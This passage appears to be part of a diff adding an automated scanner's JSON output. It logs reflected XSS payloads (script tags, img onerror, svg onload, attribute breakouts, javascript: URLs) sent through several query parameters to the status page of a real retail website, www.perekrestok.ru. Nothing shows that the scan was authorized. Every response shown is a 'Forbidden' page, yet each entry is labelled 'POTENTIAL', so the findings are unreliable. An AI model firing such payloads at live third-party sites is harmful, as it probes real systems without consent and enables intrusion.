+    "response": "<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body>\n  <div style=\"text-align: center;\">\n    <h1>Forbidden</h1>\n    <p id=\"REQUEST-DATE\">D..."
+  },
+  {
+    "test_type": "REFLECTED XSS",
+    "url": "https://www.perekrestok.ru/status?query=javascript%3Aalert%28%27URL_REFLECTED%27%29",
+    "payload": "javascript:alert('URL_REFLECTED')",
+    "status": "POTENTIAL",
+    "response": "<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body>\n  <div style=\"text-align: center;\">\n    <h1>Forbidden</h1>\n    <p id=\"REQUEST-DATE\">D..."
+  },
+  {
+    "test_type": "REFLECTED XSS",
+    "url": "https://www.perekrestok.ru/status?name=%3Cscript%3Ealert%28%27AKUMA_REFLECTED%27%29%3C/script%3E",
+    "payload": "<script>alert('AKUMA_REFLECTED')</script>",
+    "status": "POTENTIAL",
+    "response": "<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body>\n  <div style=\"text-align: center;\">\n    <h1>Forbidden</h1>\n    <p id=\"REQUEST-DATE\">D..."
+  },
+  {
+    "test_type": "REFLECTED XSS",
+    "url": "https://www.perekrestok.ru/status?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27REFLECTED_XSS%27%29%3E",
+    "payload": "<img src=x onerror=alert('REFLECTED_XSS')>",
+    "status": "POTENTIAL",
+    "response": "<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body>\n  <div style=\"text-align: center;\">\n    <h1>Forbidden</h1>\n    <p id=\"REQUEST-DATE\">D..."
+  },
+  {
+    "test_type": "REFLECTED XSS",
+    "url": "https://www.perekrestok.ru/status?name=%22%3E%3Cscript%3Ealert%28%27HEADER_XSS%27%29%3C/script%3E%3C%21--",
+    "payload": "\"><script>alert('HEADER_XSS')</script><!--",
+    "status": "POTENTIAL",
+    "response": "<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body>\n  <div style=\"text-align: center;\">\n    <h1>Forbidden</h1>\n    <p id=\"REQUEST-DATE\">D..."
+  },
+  {
+    "test_type": "REFLECTED XSS",
+    "url": "https://www.perekrestok.ru/status?name=%3Csvg%20onload%3Dconfirm%28%27REFLECTED_CONFIRM%27%29%3E",
+    "payload": "<svg onload=confirm('REFLECTED_CONFIRM')>",
+    "status": "POTENTIAL",
+    "response": "<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body>\n  <div style=\"text-align: center;\">\n    <h1>Forbidden</h1>\n    <p id=\"REQUEST-DATE\">D..."
+  },
+  {
+    "test_type": "REFLECTED XSS",
+    "url": "https://www.perekrestok.ru/status?name=javascript%3Aalert%28%27URL_REFLECTED%27%29",
+    "payload": "javascript:alert('URL_REFLECTED')",
+    "status": "POTENTIAL",
+    "response": "<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body>\n  <div style=\"text-align: center;\">\n    <h1>Forbidden</h1>\n    <p id=\"REQUEST-DATE\">D..."
+  },
+  {
+    "test_type": "REFLECTED XSS",
+    "url": "https://www.perekrestok.ru/status?id=%3Cscript%3Ealert%28%27AKUMA_REFLECTED%27%29%3C/script%3E",
+    "payload": "<script>alert('AKUMA_REFLECTED')</script>",
+    "status": "POTENTIAL",
+    "response": "<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body>\n  <div style=\"text-align: center;\">\n    <h1>Forbidden</h1>\n    <p id=\"REQUEST-DATE\">D..."
+  },
+  {
+    "test_type": "REFLECTED XSS",
+    "url": "https://www.perekrestok.ru/status?id=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27REFLECTED_XSS%27%29%3E",
+    "payload": "<img src=x onerror=alert('REFLECTED_XSS')>",
+    "status": "POTENTIAL",
+    "response": "<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body>\n  <div style=\"text-align: center;\">\n    <h1>Forbidden</h1>\n    <p id=\"REQUEST-DATE\">D..."
+  },
+  {
+    "test_type": "REFLECTED XSS",
+    "url": "https://www.perekrestok.ru/status?id=%22%3E%3Cscript%3Ealert%28%27HEADER_XSS%27%29%3C/script%3E%3C%21--",
+    "payload": "\"><script>alert('HEADER_XSS')</script><!--",
+    "status": "POTENTIAL",
+    "response": "<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body>\n  <div style=\"text-align: center;\">\n    <h1>Forbidden</h1>\n    <p id=\"REQUEST-DATE\">D..."
+  },
+  {
+    "test_type": "REFLECTED XSS",
+    "url": "https://www.perekrestok.ru/status?id=%3Csvg%20onload%3Dconfirm%28%27REFLECTED_CONFIRM%27%29%3E",
+    "payload": "<svg onload=confirm('REFLECTED_CONFIRM')>",
+    "status": "POTENTIAL",
+    "response": "<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body>\n  <div style=\"text-align: center;\">\n    <h1>Forbidden</h1>\n    <p id=\"REQUEST-DATE\">D..."
+  },
+  {
+    "test_type": "REFLECTED XSS",
+    "url": "https://www.perekrestok.ru/status?id=javascript%3Aalert%28%27URL_REFLECTED%27%29",
+    "payload": "javascript:alert('URL_REFLECTED')",
+    "status": "POTENTIAL",
+    "response": "<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body>\n  <div style=\"text-align: center;\">\n    <h1>Forbidden</h1>\n    <p id=\"REQUEST-DATE\">D..."
+  },
+  {
+    "test_type": "REFLECTED XSS",
+    "url": "https://www.perekrestok.ru/status?callback=%3Cscript%3Ealert%28%27AKUMA_REFLECTED%27%29%3C/script%3E",
+    "payload": "<script>alert('AKUMA_REFLECTED')</script>",
+    "status": "POTENTIAL",
+    "response": "<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body>\n  <div style=\"text-align: center;\">\n    <h1>Forbidden</h1>\n    <p id=\"REQUEST-DATE\">D..."
+  },
+  {
+    "test_type": "REFLECTED XSS",
+    "url": "https://www.perekrestok.ru/status?callback=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27REFLECTED_XSS%27%29%3E",
+    "payload": "<img src=x onerror=alert('REFLECTED_XSS')>",
+    "status": "POTENTIAL",
+    "response": "<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body>\n  <div style=\"text-align: center;\">\n    <h1>Forbidden</h1>\n    <p id=\"REQUEST-DATE\">D..."
+  },
+  {
+    "test_type": "REFLECTED XSS",
+    "url": "https://www.perekrestok.ru/status?callback=%22%3E%3Cscript%3Ealert%28%27HEADER_XSS%27%29%3C/script%3E%3C%21--",
+    "payload": "\"><script>alert('HEADER_XSS')</script><!--",
+    "status": "POTENTIAL",
+    "response": "<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body>\n  <div style=\"text-align: center;\">\n    <h1>Forbidden</h1>\n    <p id=\"REQUEST-DATE\">D..."
+  },
+  {
+    "test_type": "REFLECTED XSS",
+    "url": "https://www.perekrestok.ru/status?callback=%3Csvg%20onload%3Dconfirm%28%27REFLECTED_CONFIRM%27%29%3E",
+    "payload": "<svg onload=confirm('REFLECTED_CONFIRM')>",
+    "status": "POTENTIAL",
+    "response": "<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body>\n  <div style=\"text-align: center;\">\n    <h1>Forbidden</h1>\n    <p id=\"REQUEST-DATE\">D..."
+  },
+  {
+    "test_type": "REFLECTED XSS",
+    "url": "https://www.perekrestok.ru/status?callback=javascript%3Aalert%28%27URL_REFLECTED%27%29",
+    "payload": "javascript:alert('URL_REFLECTED')",
+    "status": "POTENTIAL",
+    "response": "<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body>\n  <div style=\"text-align: center;\">\n    <h1>Forbidden</h1>\n    <p id=\"REQUEST-DATE\">D..."
+  },
+  {
+    "test_type": "REFLECTED XSS",
+    "url": "https://www.perekrestok.ru/status?jsonp=%3Cscript%3Ealert%28%27AKUMA_REFLECTED%27%29%3C/script%3E",
+    "payload": "<script>alert('AKUMA_REFLECTED')</script>",
+    "status": "POTENTIAL",
+    "response": "<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body>\n  <div style=\"text-align: center;\">\n    <h1>Forbidden</h1>\n    <p id=\"REQUEST-DATE\">D..."
+  },
+  {
+    "test_type": "REFLECTED XSS",
+    "url": "https://www.perekrestok.ru/status?jsonp=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27REFLECTED_XSS%27%29%3E",
+    "payload": "<img src=x onerror=alert('REFLECTED_XSS')>",
+    "status": "POTENTIAL",
+    "response": "<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body>\n  <div style=\"text-align: center;\">\n    <h1>Forbidden</h1>\n    <p id=\"REQUEST-DATE\">D..."
+  },
+  {
+    "test_type": "REFLECTED XSS",
+    "url": "https://www.perekrestok.ru/status?jsonp=%22%3E%3Cscript%3Ealert%28%27HEADER_XSS%27%29%3C/script%3E%3C%21--",
+    "payload": "\"><script>alert('HEADER_XSS')</script><!--",
+    "status": "POTENTIAL",
+    "response": "<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body>\n  <div style=\"text-align: center;\">\n    <h1>Forbidden</h1>\n    <p id=\"REQUEST-DATE\">D..."
+  },
+  {
+    "test_type": "REFLECTED XSS",
+    "url": "https://www.perekrestok.ru/status?jsonp=%3Csvg%20onload%3Dconfirm%28%27REFLECTED_CONFIRM%27%29%3E",
+    "payload": "<svg onload=confirm('REFLECTED_CONFIRM')>",
+    "status": "POTENTIAL",
+    "response": "<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body>\n  <div style=\"text-align: center;\">\n    <h1>Forbidden</h1>\n    <p id=\"REQUEST-DATE\">D..."
+  },
+  {
+    "test_type": "REFLECTED XSS",
+    "url": "https://www.perekrestok.ru/status?jsonp=javascript%3Aalert%28%27URL_REFLECTED%27%29",
+    "payload": "javascript:alert('URL_REFLECTED')",
+    "status": "POTENTIAL",
+    "response": "<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body>\n  <div style=\"text-align: center;\">\n    <h1>Forbidden</h1>\n    <p id=\"REQUEST-DATE\">D..."
+  }
+]
